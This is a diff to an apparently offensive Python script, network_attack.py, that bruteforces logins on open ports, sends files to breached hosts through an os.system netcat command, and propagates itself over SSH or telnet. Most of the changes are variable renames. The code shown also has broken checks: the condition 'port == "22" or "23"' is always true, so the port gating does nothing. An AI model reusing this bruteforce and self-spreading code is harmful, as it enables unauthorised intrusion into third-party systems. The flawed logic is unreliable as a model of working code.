@@ -30,16 +30,16 @@ it does.
 """
 
 
-def additional_attacks(args, ip, port, bruteforce,
+def additional_attacks(arguments, ip, port, username,
                        transfer_file_filename, service):
     """
     This function passes the appropriate arguments to and runs the transferring
     file and propagating functions, these functions contain the check to stop
     them from being run if the appropriate arguments aren't used.
     """
-    try_transferring_file(args, ip, port, bruteforce, transfer_file_filename,
-                          service)
-    try_propagating(args, ip, port, bruteforce, service)
+    try_transferring_file(arguments, ip, port, username,
+                          transfer_file_filename, service)
+    try_propagating(arguments, ip, port, username, service)
 
 
 def append_lines_from_file_to_list(file):
@@ -53,19 +53,19 @@ def append_lines_from_file_to_list(file):
     return lines_list
 
 
-def assigning_values(args):
+def assigning_values(arguments):
     """
     This function will read in the target ports, target username and passwords
     filename from the user and if the user specified an ip addresses file it
     will read that and return it alongside all the other values.
     """
-    if "-t" in args:
-        ip_addresses_filename = args[args.index("-t") + 1]
+    if "-t" in arguments:
+        ip_addresses_filename = arguments[arguments.index("-t") + 1]
         try:
             ip_list = convert_file_to_list(ip_addresses_filename)
-            target_ports = args[args.index("-p") + 1]
-            target_username = args[args.index("-u") + 1]
-            passwords_filename = args[args.index("-f") + 1]
+            target_ports = arguments[arguments.index("-p") + 1]
+            target_username = arguments[arguments.index("-u") + 1]
+            passwords_filename = arguments[arguments.index("-f") + 1]
             return ip_list, target_ports, target_username, passwords_filename
         except RuntimeError:
             print(strings.ip_list_cannot_be_read(ip_addresses_filename))
@@ -456,12 +456,12 @@ def transfer_file(ip, port, login_string, transfer_file_filename):
         os.system(("nc -w 3 " + str(ip) + " " + str(port) + " < "
                    + str(transfer_file_filename) + "\n").encode("ascii"))
         return True
-    except RuntimeError:
+    except ConnectionRefusedError:
         return False
 
 
 def try_attack(ip, port, target_username, password_list,
-               transfer_file_filename, args):
+               transfer_file_filename, arguments):
     """
     This function will attempt a bruteforce attack across various services
     depending on the ip or port supplied (if the port is open on that IP), it
@@ -474,11 +474,14 @@ def try_attack(ip, port, target_username, password_list,
     print("Now testing the following address: " + ip_address_and_port + "...")
     if scan_port(ip, port):
         print(ip_address_and_port + " is open.")
-        bruteforce = try_bruteforce(ip, port, target_username, password_list,
-                                    ip_address_and_port)
-        if bruteforce[0]:
-            additional_attacks(args, ip, port, bruteforce[0],
-                               transfer_file_filename, bruteforce[1])
+        bruteforce_login_details = try_bruteforce(ip, port, target_username,
+                                                  password_list,
+                                                  ip_address_and_port)
+        if bruteforce_login_details[0]:
+            additional_attacks(arguments, ip, port,
+                               bruteforce_login_details[0],
+                               transfer_file_filename,
+                               bruteforce_login_details[1])
     else:
         print(ip_address_and_port + " is closed.")
 
@@ -533,7 +536,7 @@ def try_password_for_service(ip, port, username, password):
         return ""
 
 
-def try_propagating(args, ip, port, bruteforce, service):
+def try_propagating(arguments, ip, port, bruteforce, service):
     """
     This function attempts propagation of the network_attack.py script over
     the network. If it succeeds we alert the user and let them know what
@@ -542,7 +545,7 @@ def try_propagating(args, ip, port, bruteforce, service):
     for the script to be propagated over the network then we let them know this
     part of the process will not be done.
     """
-    if "-P" in args and (port == "22" or "23"):
+    if "-P" in arguments and (port == "22" or "23"):
         propagated = propagate_script(ip, port, bruteforce)
         if propagated:
             print("Script propagated over " + service + ".")
@@ -552,8 +555,8 @@ def try_propagating(args, ip, port, bruteforce, service):
         print("Requirement to propagate script not specified, skipping...")
 
 
-def try_transferring_file(args, ip, port, bruteforce, transfer_file_filename,
-                          service):
+def try_transferring_file(arguments, ip, port, bruteforce,
+                          transfer_file_filename, service):
     """
     This function attempts transferring a user specified file across the
     network. If it succeeds we alert the user and let them know transferring
@@ -562,7 +565,7 @@ def try_transferring_file(args, ip, port, bruteforce, transfer_file_filename,
     user have never asked for a file to be transferred over the network then we
     let them know this process will not be done.
     """
-    if "-d" in args and (str(port) == "22" or "23"):
+    if "-d" in arguments and (str(port) == "22" or "23"):
         transferred = transfer_file(ip, port, bruteforce,
                                     transfer_file_filename)
         if transferred:
